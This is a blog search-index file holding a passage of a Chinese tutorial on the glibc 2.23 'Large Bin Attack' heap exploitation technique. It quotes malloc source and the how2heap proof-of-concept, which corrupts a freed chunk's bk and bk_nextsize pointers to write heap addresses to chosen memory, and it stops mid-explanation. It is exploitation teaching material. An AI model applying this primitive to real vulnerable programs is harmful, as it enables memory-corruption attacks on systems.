<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Large Bin Attack</title>
      <link href="/2025/04/24/Large-Bin-Attack/"/>
      <url>/2025/04/24/Large-Bin-Attack/</url>
      
        <content type="html"><![CDATA[<h1 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h1><ul><li><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念 :"></a>基本概念 :</h2></li></ul><p>Large Bin 是 glibc 堆内存管理中的一种数据结构，用于存储较大尺寸的空闲内存块，一般管理大于1024字节的空闲chunk（32-bit 系统 512 字节，64-bit 系统 1024 字节）。</p><ul><li><h2 id="Large-Bin-的结构"><a href="#Large-Bin-的结构" class="headerlink" title="Large Bin 的结构 :"></a>Large Bin 的结构 :</h2></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Large Bin 在结构上与其他 Bins 有所不同，在拥有 prev_size 、 size 以及 fd 、 bk 的情况下，<strong>还多了fd_nextsize 和 bk_nextsize 两种指针结构</strong></p><ul><li>fd_nextsize 表示指向前一个与当前chunk大小不同的第一个空闲块，不包含Bin的头指针。</li><li>bk_nextsize 表示指向后一个与当前chunk大小不同的第一个空闲块，不包含Bin的头指针。</li></ul><p>**组成部分:**Large Bins 中含有 63 个Bins ，而 Large Bins 总体又被分成 6 个组 ， 每个组对应一个区间，且容纳个数呈指数性减少。</p><p><img src="/../PWN/LargeBinAttack/1.png" alt="image-20250425150822345"></p><ul><li><h2 id="链表结构："><a href="#链表结构：" class="headerlink" title="链表结构："></a>链表结构：</h2><img src="/../PWN/LargeBinAttack/2.png" alt="image-20250425154611746"></li></ul><h3 id="补充-："><a href="#补充-：" class="headerlink" title="补充 ："></a>补充 ：</h3><p>只有首堆块的fd_nextsize、bk_nextsize会指向其他大小的内存块，其相同大小的非首堆块的fd_nextsize、bk_nextsize无效 ，通常为0。</p><ul><li><h2 id="插入顺序："><a href="#插入顺序：" class="headerlink" title="插入顺序："></a>插入顺序：</h2></li></ul><p><strong>LIBC-2.23源码：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range(size)) </span><br><span class="line">&#123;</span><br><span class="line">  victim_index = smallbin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  victim_index = largebin_index(size);</span><br><span class="line">  bck = bin_at(av, victim_index); </span><br><span class="line">  fwd = bck-&gt;fd; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line"></span><br><span class="line">      size |= PREV_INUSE;</span><br><span class="line">      assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line"></span><br><span class="line">          fwd = bck;</span><br><span class="line">          bck = bck-&gt;bk; </span><br><span class="line"></span><br><span class="line">          victim-&gt;fd_nextsize = fwd-&gt;fd; </span><br><span class="line"></span><br><span class="line">          victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; </span><br><span class="line"></span><br><span class="line">          fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"></span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">          assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              fwd = fwd-&gt;fd; </span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><ol><li>在 Large Bin 中 ，堆块的排列顺序是从大到小，越大的堆块越靠近头部，越小的堆块越靠近尾部。</li><li>大小相同的堆块 ， 按照 free 的先后顺序排序 ，最先释放的堆块作为首堆块，其次释放的堆块延续往后。</li></ol><h1 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h1><p>Large Bin Attack 的攻击方式在低版本glibc-2.23和高版本glibc-2.31有所不同，所以我们需要划分为两个板块，分别来描述其攻击手法。</p><h2 id="GLIBC-2-23-攻击手法"><a href="#GLIBC-2-23-攻击手法" class="headerlink" title="GLIBC-2.23 攻击手法"></a>GLIBC-2.23 攻击手法</h2><p>为了便于理解，本文将使用<a href="https://github.com/shellphish/how2heap">how2heap</a>关于Large Bin Attack漏洞利用的源码进行调试分析。</p><h4 id="how2heap源码展示："><a href="#how2heap源码展示：" class="headerlink" title="how2heap源码展示："></a>how2heap源码展示：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    assert(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Large-Bin-Attack-的利用思路以及其作用："><a href="#Large-Bin-Attack-的利用思路以及其作用：" class="headerlink" title="Large Bin Attack 的利用思路以及其作用："></a>Large Bin Attack 的利用思路以及其作用：</h3><p>再进行下一步的调试之前，我们需要先知道 Large Bin Attack 的利用思路和作用，才能帮助我们更好的理解 Large Bin Attack 手法：</p><ul><li>利用思路：通过纂改已释放的大堆块的 bk_nextsize 指针 ， 在 largebin 的插入过程中，利用大堆块的排序机制 ，实现 Large Bin Attack。</li><li>作用：可以实现任意地址写入堆块地址。</li></ul><h3 id="Large-Bin-Attack-源码调试："><a href="#Large-Bin-Attack-源码调试：" class="headerlink" title="Large Bin Attack 源码调试："></a>Large Bin Attack 源码调试：</h3><p>（为了更加便于理解，我会把调试过程拆解成几个大板块，同时分支细化成数个小板块）</p><p><u>第一步：目标地址以及大堆块的创建</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426195629165.png" alt="image-20250426195629165"></p><p>创建了两个变量 stack_var1 和 stack_var2 ，以及三个大堆块 p1、p2 和 p3，大小分别是0x430、0x510、0x510 ，其中每个大堆块以及 Top chunk 中间都隔了一个0x30小堆块，这个小堆块的作用是防止大堆块之间相互合并。</p><p><strong>我们的目标就是将 stack_var1 和 stack_var2 的值改写成堆块的地址，可以看到现在两个变量的值都是零 。</strong></p><p><u>第二步：释放 p1 和 p2 ，使其进入 unsorted bin。</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line"><span class="built_in">free</span>(p2);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426195752913.png" alt="image-20250426195752913"></p><p><u>第三步：申请一个合适大小的堆块，触发 unsorted bin 遍历 。</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><hr><h4 id="unsorted-bin-相关机制："><a href="#unsorted-bin-相关机制：" class="headerlink" title="unsorted bin 相关机制："></a>unsorted bin 相关机制：</h4><p>我们要使 unsorted bin 进入 large bin ， 就要先知道unsorted bin的相关机制，通常我们释放一个堆块，glibc会尝试与前后堆块发生合并，合并后若非topchunk，且大小超过 unsorted bin 的设定阈值 , 它不会立即进入small bin &#x2F; large bin 中 ，而是进入 unsorted bin 中缓存起来，同时unsorted bin采用**<u>先进先出</u>**的插入取出方式。</p><p>在调用下一次 malloc(req_size) 时，首先会检查 fastbin 、small bin 然后才到 unsorted bin ，此时会依次取出 unsorted bin 表尾部的chunk(victim)，如果 chunksize(victim) 恰好等于 req_size , 就会直接返回；否则就会根据大小阈值（64-bit系统 &lt;&#x3D; 1024字节进入small bin ，&gt;1024字节进入large bin）插入相对应的 bin 中，再继续尝试下一个 unsorted 条目 。</p><p>如果 unsorted bin 遍历结束还没有找到相应大小的堆块 ，就会依次搜索 small bins 、 large bins ，若仍无合适的堆块，则调用sysmalloc，向系统申请新的堆块空间。</p><hr><p>根据 unsorted bin 相关机制 ，由于我们申请的0x90大小的堆块会优先检查fastbin和small bin，发现两个bins中都没有堆块，于是就进入 unsorted bin 中触发了 unsorted bin 遍历 ，由于unsorted bin 先进先出的规则 ，P1 会先被我们拿出来检查 ，发现大小不等于我们需要申请的0x90的堆块 ，于是根据大小阈值(0x400)，被划入了 large bin 当中，然后接着取出 P2 ，发现同样不满足对应大小 ，于是同样进入了  large bin 当中，unsorted bin 遍历结束 ，发现没有合适的 bin ，就会依次搜索 small bins ，large bins ，同时在搜索large bins的时候，采取 Best-fit 策略，也就是当申请的堆块 &lt;&#x3D;large bin(min_chunk)最小堆块的时候，就会优先从最小堆块进行分配 。</p><p>很显然由于 P1 &#x3D; 0x430 , P2 &#x3D; 0x510 ，所以P1会被拿出来分配堆块，然后分配完堆块的P1就会又被重新放回unsorted bin中。</p><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426203532614.png" alt="image-20250426203532614"></p><p>现在的局面变成了 P1 进入了unsorted bin, P2 进入了 large bin ，P3为 Allocated chunk 。</p><p><u>第四步：释放P3，三BIN鼎立</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(p3);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426204107261.png" alt="image-20250426204107261"></p><p><u>第五步：构造Large Bin Attack</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426212145734.png" alt="image-20250426212145734"></p><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426211737512.png" alt="image-20250426211737512"></p><p>假设有漏洞可以纂改覆写 P2 的 size 、bk 以及 bk_nextsize ，这里是将 P2 的 size 变成了 0x3f1 ，fd 变成了 0 ，bk 变成了 stack_var1 -0x10 , fd_nextsize 变成了 0  ，bk_nextsize 变成了 stack_var2 - 0x20 。</p><p>此时的结构如下图所示：</p><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426211703179.png" alt="image-20250426211703179"></p><p>由于 bk 和 bk_nextsize 的纂改 ，构造了两个目标地址附近的fake_chunk 。</p><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426213622567.png" alt="image-20250426213622567"></p><p>但是此时的目标地址的值还没有被修改成堆地址，还需要进行最后一步操作。</p><p><u>第六步：将P3放入 large bin 内，触发 large bin attck 。</u></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br></pre></td></tr></table></figure><p>这一步同上一步一样重要 ，前面提到过 ，Large Bin Attack 无非就是利用大堆块排序机制，这里我们需要把P3放入large bin后，才能触发 Large Bin Attack。</p><p>所以我们需要malloc(0x90)再次触发unsorted bin遍历，首先按照程序肯定是先检查fast bin、small bin，这里面没有，于是就接着检查unsorted bin(此时只有P1和P3在unsorted bin中)，根据先进先出原则，把 P1 给取出来，判断不满足合适大小，直接依照大小阈值，放入small bin中，然后把 P3 拿出来，判断不满足合适大小，放入 large bin 中，遍历结束，没有发现合适堆块，于是依次检查small bin，和 large bin ， 由于 small bin 中只有P1 ，于是 P1 又被拿出来分配堆块，而后重新丢入了 unsorted bin 中(P1好可怜🥹)，而 P3 留在了 large bin 内。</p><p>P3 进入了 large bin 导致触发了 Large Bin Attack ，为什么会触发这个呢？让我们来根据GLIBC-2.23的源码进行分析。</p><p><strong>关于进入large bin的大堆块排序相关源码在下：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              fwd = fwd-&gt;fd; </span><br><span class="line">          <span class="keyword">else</span> </span><br><span class="line">          &#123;</span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">          &#125;</span><br><span class="line">          bck = fwd-&gt;bk;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">else</span> </span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>内容稍微有一点多 ，我们把源码拆解分析 ：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>首先是这个while循环部分，这里对进入large bin的堆块size进行了一个判断，如果进入large bin的size小于前一个堆块的size，就会执行while循环里面的内容（其实里面就是一个简单的循环排序法，会根据判断，把进入large bin的堆块随着循环不断置前，直到不小于前面一个堆块的size为止——Large Bin由大到小排序），但是由于我们纂改了 P2 的size为 0x3f1 , 并且 P3 &#x3D; 0X510 ，所以P3大于P2 , 不满足while循环的条件,于是我们跳过while循环，来到了下面一个部分。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">    fwd = fwd-&gt;fd; </span><br></pre></td></tr></table></figure><p>这一部分是判断进入Large Bin堆块的size 与前面一个空闲堆块的size是否相等，如果相等的话就会执行if语句里面的内容，但是很显然，进入large bin的 P3 明显不等于 P2，所以跳过了 if 语句里面的内容，进入下一个部分。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> </span><br><span class="line">     &#123;</span><br><span class="line">         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">     &#125;</span><br><span class="line">     bck = fwd-&gt;bk;</span><br></pre></td></tr></table></figure><p>这一部分是我们必须要执行的部分了，很明显是对victim(P3)结构的一些赋值操作，这段源码造成了以下影响：</p><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426225014983.png" alt="image-20250426225014983">（红色部分是前三条源码改变的部分)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br></pre></td></tr></table></figure><p>将 P3 的 fd_nexsize 变成了 P2 的地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br></pre></td></tr></table></figure><p>将 P3 的 bk_nextsize 变成了 P2 的 bk_nextsize 也就是 stack_var2 - 0x20</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fwd-&gt;bk_nextsize = victim;</span><br></pre></td></tr></table></figure><p>将 P2 的 bk_nextsize 变成了 P3 的地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>**关键的一步：**将 P3 的 bk_nextsize 也就是 stack_var2 - 0x20 的 fake_chunk 的 fd_nextsize(stack_var2)变成了 P3 的地址 ！</p><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426225937386.png" alt="image-20250426225937386"></p><p>细心的你现在可以发现，Large Bin Attack 已经实现了 ，我们把 stack_var2 目标地址写入了我们P3堆块的地址 。</p><p>但是 Large Bin Attack 还没有结束 ，我们接着往下面看。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426231400362.png" alt="image-20250426231400362"></p><p>上面是在执行代码之前的结构（图一）</p><p><img src="C:\Users\35172\AppData\Roaming\Typora\typora-user-images\image-20250426232438420.png" alt="image-20250426232438420"></p><p>上面是在执行代码之后的结构（图二）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk = bck;</span><br></pre></td></tr></table></figure><p>首先我们要知道 P3 在进入large bin是插入到 P2 